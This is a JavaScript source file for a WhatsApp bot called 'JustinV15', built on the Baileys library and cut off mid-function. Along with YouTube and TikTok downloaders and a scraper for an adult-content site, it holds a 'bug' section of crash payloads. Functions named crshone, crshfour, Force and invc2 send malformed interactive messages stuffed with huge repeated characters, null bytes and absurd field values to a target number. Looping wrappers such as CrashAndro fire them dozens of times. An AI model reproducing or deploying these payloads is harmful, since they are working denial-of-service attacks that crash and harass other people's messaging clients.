
require('./config')
const {
	JustinnConnect,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const path = require('path');
const jimp = require('jimp');
const chalk = require('chalk');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const search = require ("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const JsConfuser = require('js-confuser');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const axios = require('axios')
const util = require('util')
const { y2mateplay, y2matemp3, y2matemp4 } = require('./Internal/lib/y2mate')
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./Internal/lib/scraper');
const tdxlol = fs.readFileSync('./Justin/justinv15.jpeg')

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function capital(string) {
return string.charAt(0).toUpperCase() + string.slice(1);
}

//=================================================//
module.exports = Justinn = handler = async (Justinn, m, chatUpdate, store) => {
	try {
	
		const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./Internal/lib/myfunc.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./Internal/lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./Internal/lib/uploader');
    //=================================================//
		var body = (
			m.mtype === 'conversation' ? m.message.conversation :
			m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
			m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
			m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
			m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
			m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
			m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
			m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
			m.mtype === 'messageContextInfo' ?
			m.message.buttonsResponseMessage?.selectedButtonId ||
			m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
			m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
			m.text :
			''
			);
		if (body == undefined) { body = '' };
		var budy = (typeof m.text == "string" ? m.text : "");
    //=================================================//
		//command
		const from = m.key.remoteJid
		const prefixRegex = /[.!#÷×/]/;
		const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
		const isCmd = prefix ? body.startsWith(prefix) : false;
		const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';		
		const args = budy.trim().split(/ +/).slice(1);
		const q = text = args.join(' ')

		// Individual
		const makeid = crypto.randomBytes(3).toString('hex')
		const contacts = JSON.parse(fs.readFileSync("./Internal/database/ctcs.json"))
		const botNumber = await Justinn.decodeJid(Justinn.user.id)
		const pushname = m.pushName || "No Name";
		const senderNumber = m.sender.split('@')[0];	
		const owners = JSON.parse(fs.readFileSync("./Internal/database/own.json"))
		const itsMe = m.sender == botNumber;
		const isOwner = [botNumber.split('@')[0], ...global.owner].includes(m.sender.split("@")[0]) ? true : owners.includes(m.sender) ? true : false
			const isCreator = [botNumber.split('@')[0], ...global.owner].includes(m.sender.split("@")[0]) ? true : owners.includes(m.sender) ? true : false
	/*	if (!Justinn.public) {
			if (!m.fromMe && !isOwner) return;
		};*/

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

		// Group
       const remoteJid = m.key.remoteJid
       const itil = String.fromCharCode(8206)
	   const readmore = itil.repeat(4001)
		const isGroup = m.chat.endsWith('@g.us');
		const groupMetadata = isGroup ? await Justinn.groupMetadata(m.chat).catch(e => {}) : '';
		const groupName = isGroup ? groupMetadata.subject : '';
		const groupMembers = isGroup ? groupMetadata.participants : '';
		const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : '';
		const isBotAdmin = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false;
		const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
		const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
		const groupOwner = isGroup ? groupMetadata.owner : '';
		const prem = JSON.parse(fs.readFileSync('./Internal/database/prem.json'))	
		
	const unli = JSON.parse(fs.readFileSync("./Internal/database/unli.json"))

const saldo = JSON.parse(fs.readFileSync("./Internal/database/saldo.json"));
let db_saldo = JSON.parse(fs.readFileSync("./Internal/database/saldo.json"));
const { bugdray4, bugios } = require("./Internal/lib/snap")
		const isPrem = prem.includes(m.sender)
		
		const isPremium = prem.includes(m.sender)
		const isUnli = unli.includes(m.chat)
		const reseller = JSON.parse(fs.readFileSync('./Internal/database/reseller.json'))		
		const isReseller = reseller.includes(m.sender)
		
		const isGroupOwner = isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;

		//msg & imgs
		const isMedia = (m.type === 'imageMessage' || m.type === 'videoMessage')
		const fatkuns = (m.quoted || m)
		const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
		const qmsg = (quoted.msg || quoted)
		const mime = qmsg.mimetype || "";

// R34 //
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		// pp for QC //
		
           let ppuser
           try {
           ppuser = await Justinn.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://files.catbox.moe/cx09ww.jpg'
           }

	
		// Play //
				const YouTubeMp3 = async (Link, Quality = 128) => {
			try {
				if (!isUrl(Link)) return m.reply("Cekk Tulisan Kamu, Itu Salah!")
				let data = await ytdl.ytmp3(Link, Quality);
				await Justinn.sendMessage(m.chat, {
					audio: {
						url: data.download.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YTMP3 - ${data.download.quality}`,
							body: data.metadata.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: data.metadata.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};

//const ridmy = fs.readFileSync('./CARA-PAKAI.txt')    
//const kura = fs.readFileSync('./YT : JustinOfficial-ID')    

		// dll //
				const YouTubeMp4 = async (Link, Quality = 360) => {
			try {
				if (!isUrl(Link)) return xpaytod("Mana link nya?")
				let data = await ytdl.ytmp4(Link, Quality);
				const caption = `*${data.metadata.title}*

*Ext* : Download
*ID* : ${data.metadata.videoId}
*Durasi* : ${data.metadata.timestamp}
*Upload* : ${data.metadata.ago}
*Views* : ${data.metadata.views}
*Quality* : ${data.download.quality}
*Channel* : ${data.metadata.author.name}

© JustinOfficialV15 `;

				await Justinn.sendMessage(m.chat, {
					video: {
						url: data.download.url
					},
					caption: caption,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};
		
		
// Pencarian gambar video
const justinoffc = fs.readFileSync('./Justin/justinoffc.jpg')
const marga = fs.readFileSync('./Justin/marga.jpg')
const foto = fs.readFileSync('./Justin/vip15.jpg')    
const marah = fs.readFileSync('./Justin/marah.jpg')    
const justin = fs.readFileSync('./Justin/justin.jpg')    

		//time
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu;
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "夜 🌌";
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "午後 🌇";
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "正午 🏞️";
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "朝 🌁";
		} else {
			ucapanWaktu = "夜明け 🌆";
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z");
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z");
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
		let d = new Date();
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime();
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5];
		let week = d.toLocaleDateString("id", { weekday: "long" });
		let calendar = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		});		

//UCAPAN WAKTU
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();
//END UCAPAN WAKTU

        //quoted
		const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', // 'status@broadcast', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, saya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

		const callg = {
			key: {
				remoteJid: 'status@broadcast', //'0@s.whatsapp.net', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, sebaiknya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                }
			}
		};
// Constnya
        const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "JustinOfficialV15",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "JustinV15" + "ꦾ".repeat(103000),
        "body": {
            "text": "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "TAMARYUICHI" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "JustinOfficialV15",
            "body": "JustinV15 Vip",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://youtube.com/@justinofficial-id",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "justindrayyy ~ Flex Agency",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}

const cursorCrsh = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
paymentInviteMessage: {
serviceType: 1,
expiryTimestamp: "ꦾ".repeat(1000)
}
}
}

async function crshone(nomor) {
     let bijipler = nomor 
     let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️ꦾ".repeat(1000)
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {quoted:cursorCrsh});
            await Justinn.relayMessage(bijipler, msg.message, { participant: { jid: bijipler }, messageId: msg.key.id });
            }
            
           
async function crshfour(target) {
   const ptcp = true
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "x"+ "ꦽ".repeat(15000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "😹",
          },
          contextInfo: {
            virtexId: Justinn.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "🥀",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: tdxlol,
                },
                hasMediaAttachment: true,
                contentText: '🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️"👋"',
                footerText: "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️ ꦽ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/justinoffc",
              buttonTitle: "Ampas",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "meta crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  
  await Justinn.relayMessage(target, msg, {
        participant: { jid: target },
      },{ quoted: cursorCrsh });
  
  await Justinn.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  },{ quoted: cursorCrsh });
}

//FUNC BUG
        const ryclol = fs.readFileSync('./justinganteng.jpg')
async function Force(isTarget) {
const stanza = [
    {
      attrs: { biz_bot: '1' },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Developer JustinOfficial" + "ꦾ".repeat(4500),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🔪",
          },
          contextInfo: {
            stanzaId: Justinn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [isTarget, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "p",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️",
                },
                contentText: "𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!! \"😮‍💨\"",
                footerText: "p",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "p",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: ryclol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "wangcap",
            entryPointConversionApp: "wangcap",
            actionLink: {
              url: "t.me/justinoffc",
              buttonTitle: "trash",
            },
            disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: isTarget,
                            initiatedByExternalService: true,
                            initiatedByUserDevice: true,
                            initiatedBySystem: true,
                            initiatedByServer: true,
                            initiatedByAdmin: true,
                            initiatedByUser: true,
                            initiatedByApp: true,
                            initiatedByBot: true,
                            initiatedByMe: true
                        },
            groupSubject: "crash",
            parentGroupJid: "combine",
            trustBannerType: "unexpected",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: "𑲭𑲭 🩸JustinV15 Kill You!!🗡️ ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© JustinV15",
              thumbnail: ryclol,
              sourceUrl: "se me?",
              sourceId: "xd ~ broken",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "burst",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "trash",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1,
              newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "crash",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "INITIATED_BY_USER",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Justinn.relayMessage(isTarget, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: isTarget },
  });
  
}
async function invc2(nomor) {
     let target = nomor
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "🩸𝗝𝘂𝘀𝘁𝗶𝗻𝗩𝟭𝟱 𝗞𝗶𝗹𝗹 𝗬𝗼𝘂!!🗡️"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Justinn.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

//Batas Func        
        //Pemanggilan
async function CrashAndro(target) {
for (let i = 0; i < 35; i++) {
await crshone(target)
await crshfour(target)
await Force(target)
await invc2(target)
await CrashAndro(target)
await sendOfferVideoCall(target)

//bisa lu combo sama func laen
    console.log(chalk.blue("JustinV15 Sedang Menyerang Target!!"));
    }
        
}

async function CrashAndroX(target) {
for (let i = 0; i < 55; i++) {
await crshone(target)
await crshfour(target)
await Force(target)
await invc2(target)
}}
        
        async function CrashMedium(target) {
for (let i = 0; i < 35; i++) {
await crshone(target)
await crshfour(target)
await Force(target)
await invc2(target)
await CrashAndro(target)
await sendOfferVideoCall(target)

//bisa lu combo sama func laen
    console.log(chalk.blue("JustinV15 Sedang Menyerang Target!!"));
    }
        
}
// Akhir Bug
        //reply
								


const downloadMp4 = async (Link) => {
try{
let yutub = await y2matemp4(Link)
//if (yutub.size < 104857600) {
const SiXcz = `*${yutub.title}*\n\nID: ${yutub.vid}`;
await Justinn.sendMessage(m.chat, { video: { url: yutub.video["360"].url }, caption: SiXc,gifPlayback: false},{quoted: qmime})
/*} else {
await m.reply(`File video ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch(err) {
m.reply(`${err}`)
}}

const downloadMp3 = async (Link) => {
try{
let yutub = await y2matemp3(Link)
//if (yutub.size < 62914560) {
await Justinn.sendMessage(m.chat, {audio: { url: yutub.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "YouTube - Play",
